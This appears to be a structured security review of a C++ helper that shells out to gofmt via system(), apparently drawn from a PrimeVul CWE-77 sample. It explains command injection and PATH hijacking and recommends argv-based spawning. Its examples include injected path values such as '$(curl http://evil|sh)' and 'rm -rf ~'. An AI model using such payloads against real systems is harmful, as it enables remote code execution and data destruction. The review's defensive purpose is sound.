subsystem: A C++ helper function, format_go_output, that reformats a Go source file in place by shelling out to the external gofmt tool. It is a build/codegen convenience utility that takes a file path and invokes 'gofmt -w <path>' via the C library system() call, returning success/failure to its caller.
provenance: Identified from the code itself: the leading comment '/* sample: primevul_train_2336_vuln */' marks it as a PrimeVul training sample, and the filename corpus/train/train_0330_cwe77.cpp tags it CWE-77 (command injection). The function name format_go_output, the literal 'gofmt -w ', use of std::string (const string&), and the C runtime calls system()/fprintf identify it as C++ that drives the Go toolchain's formatter. No SPDX or copyright header is present.
trust_boundary: The single parameter const string& file_path is the untrusted input. It is concatenated directly into a shell command line that is handed to system(), which runs it through /bin/sh -c. Any caller-supplied path — and in build tooling these paths frequently originate from source trees, archives, user configuration, repository contents, CI job parameters, or filenames chosen by an attacker who can influence the workspace — crosses into a shell interpreter. The trust boundary is therefore at the function's entry: the moment file_path is allowed to carry shell metacharacters, the string ceases to be data and becomes executable shell.

what_the_code_does.code:
/* sample: primevul_train_2336_vuln */
bool format_go_output(const string& file_path) {
what_the_code_does.explanation: Line 1 is a provenance comment tagging this as a PrimeVul training sample (per the review method, any comment claiming safety or steering the task is untrusted and ignored; this one is merely a label). Line 2 declares the function format_go_output returning bool and taking a single argument file_path passed by const reference to a std::string. The bool return communicates whether the external formatting step succeeded. The const& means the callee does not copy or mutate the string, but it also means the callee has no control over where the string's contents came from — the value is entirely determined by the caller and thus by whatever produced that path.

This is the security-critical line. A shell command line is built by string concatenation: the fixed prefix "gofmt -w " (invoke the Go formatter with -w to rewrite the file in place) is joined with the raw file_path using std::string operator+. There is no quoting, no escaping, and no validation of file_path. The result is a single std::string named command that is intended to be interpreted by a shell. Because the concatenation preserves every byte of file_path verbatim, any shell-significant character in the path (spaces, ;, |, &, $(), backticks, redirection, newlines) becomes part of the command's syntax rather than a filename argument.

command.c_str() yields a C string pointer into the std::string's buffer (valid here because command is a live local, so no dangling issue), and that pointer is passed to system(). system() launches /bin/sh -c "<command>", meaning the shell parses and executes the entire string. A return value of 0 is the shell's exit status for a successful command (gofmt exited 0), so the function returns true. Note that system() returning 0 only tells the caller the shell's last command succeeded; it does not distinguish gofmt running from an injected command running.

On any non-zero exit from system(), the function logs a warning to stderr that embeds the full command string (again via command.c_str()) with the %s conversion — the format string is a fixed literal, so there is no format-string vulnerability here — and returns false. The log echoes the constructed command including the attacker-influenced path, which aids debugging but also discloses the exact executed string. Line 11 closes the function.

what_could_go_wrong.explanation: This concatenation is the injection primitive. file_path is attacker-influenced and is spliced into a shell command with no sanitization. If file_path is, for example, 'x.go; rm -rf ~' or 'x.go $(curl http://evil/x|sh)' or '`reboot`', the semicolon/command-substitution/backtick sequences are interpreted by the shell in the next step, executing arbitrary commands with the privileges of the process. Even without deliberate metacharacters, a path containing spaces breaks argument boundaries so gofmt receives the wrong operands. The invariant the implementation must uphold: file_path must be passed to the formatter as a single, literal argument that the shell can never re-interpret — i.e., never build a shell string out of it.

system() is the sink that turns the tainted string into code execution: it runs its argument through /bin/sh -c, so every shell metacharacter in file_path (; | & $() `` newline > < *) is honored. This is the concrete CWE-77/CWE-78 command injection. Impact is arbitrary command execution in the context of this process — in a CI or build server that can mean full compromise, secret exfiltration, or lateral movement. The safe design is to bypass the shell entirely: use posix_spawn/execvp (or fork+execvp) with an argv array like {"gofmt","-w",file_path,NULL}, so file_path is a single opaque argv element and no shell parsing occurs. If a shell truly must be used, the path would need rigorous allow-list validation and shell-quoting, which is strictly worse than argv.

Secondary robustness issue at the same line: the command relies on gofmt being resolvable via the inherited PATH. Because system() uses the environment's PATH, an attacker who can control PATH (or drop a malicious 'gofmt' earlier in it) can substitute their own binary — a PATH-hijacking vector (CWE-426/CWE-77 adjacent). Argument order also matters: an option-looking path such as '--help' or a leading '-' could be misparsed by gofmt, but that is a functional bug, not the primary security defect. The dominant issue remains the unsanitized shell string.

summary: Classic shell command injection: format_go_output builds a shell command line by concatenating an untrusted file_path into "gofmt -w " and executes it with system(), which invokes /bin/sh -c. A path containing shell metacharacters yields arbitrary command execution in the process's context. This is a critical CWE-77/CWE-78 defect; the fix is to spawn gofmt via an argv array (execvp/posix_spawn) and never construct a shell string from external input.

reviewed_anchors.anchor: format_go_output(const string& file_path) — function signature, line 2
reviewed_anchors.reason: file_path is untrusted input that flows unsanitized into a shell command; the signature defines the tainted entry point.
String concatenation of external input into a shell command line with no quoting/escaping is the injection primitive.
system() runs the tainted string through /bin/sh -c; this is the code-execution sink (CWE-78).
command is a live local std::string at both call sites, so the returned pointer is valid; no dangling/use-after-free here.
Format string is a fixed literal and command is passed as a %s data argument, so there is no format-string bug; it only discloses the executed command to stderr.
Reliance on PATH to resolve gofmt via the shell enables PATH-hijacking / binary substitution; noted as a secondary vector on the same anchor.
Carries only success/failure of system(); no attacker-controllable buffer or length contract, so no direct security finding.

findings.title: Shell command injection via unsanitized file_path passed to system()
findings.bug_class: OS command injection (shell metacharacter injection into system())
findings.invariant: The file path must be delivered to gofmt as a single, literal argv element that no shell can re-parse; external input must never be concatenated into a string handed to system()/popen()/a shell.
findings.failure_mode: An attacker who controls or influences file_path supplies shell metacharacters, e.g. 'a.go; rm -rf ~', 'a.go $(curl http://evil|sh)', or 'a.go `id`'. system() passes the concatenated string to /bin/sh -c, which interprets the metacharacters and executes arbitrary commands with the process's privileges. Impact: remote/authenticated arbitrary command execution, especially severe in build/CI contexts.
findings.what_to_confirm: Confirm that file_path can originate from an untrusted source (repo contents, archive entry, user/CI input) and that no upstream validation/allow-listing sanitizes it before this call; confirm the process runs with privileges worth escalating from.

findings.title: Argument-splitting / malformed invocation from unquoted path concatenation
findings.bug_class: Improper neutralization of arguments / shell word-splitting
findings.invariant: Path arguments must retain their identity as a single token; spaces, globs, and leading dashes in a path must not alter which files or options gofmt sees.
findings.failure_mode: Even absent deliberate injection, a path with spaces ('my dir/a.go') is split by the shell into multiple gofmt operands, and a path beginning with '-' (or containing glob characters * ? [ ]) is misinterpreted as an option or expanded, causing gofmt to operate on the wrong files or fail. This is the same root cause (no argv separation) as the injection and is fixed by the same argv-array remediation.
findings.what_to_confirm: Verify whether callers ever pass paths with spaces, globs, or leading dashes, and confirm the fix switches to execvp/posix_spawn with {"gofmt","-w",file_path,NULL}.

findings.title: PATH-based binary hijacking of gofmt via shell resolution
findings.invariant: The formatter binary must be resolved from a trusted, fixed location (or absolute path) with a controlled environment, not from an attacker-influenceable PATH.
findings.failure_mode: system() spawns /bin/sh, which resolves the bare name 'gofmt' using the inherited PATH. If an attacker can prepend a directory to PATH or drop a malicious 'gofmt' executable earlier in the search order (common in shared build agents or when the working directory is on PATH), their binary runs instead of the real formatter.
findings.what_to_confirm: Check whether PATH and the environment are attacker-controllable at this call site and whether an absolute path to gofmt with a sanitized environment is used.

audit_checklist: Replace system() with a shell-free spawn: posix_spawn or fork+execvp using argv {"gofmt","-w",file_path,NULL} so file_path can never be reinterpreted by a shell.
Trace every caller of format_go_output to establish whether file_path derives from untrusted input (repo/archive/user/CI); treat it as hostile until proven otherwise.
If a shell cannot be avoided, enforce a strict allow-list on the path (e.g. reject any byte outside a safe set, reject leading '-') and shell-quote — but prefer argv.
Resolve gofmt from an absolute, trusted path and run with a sanitized environment/PATH to prevent binary substitution.
Do not rely on system()'s 0 return to prove gofmt ran; ensure error handling distinguishes formatter failure from an injected command's exit status.
Confirm the stderr WARNING log does not leak sensitive path/command contents into a lower-trust log sink.
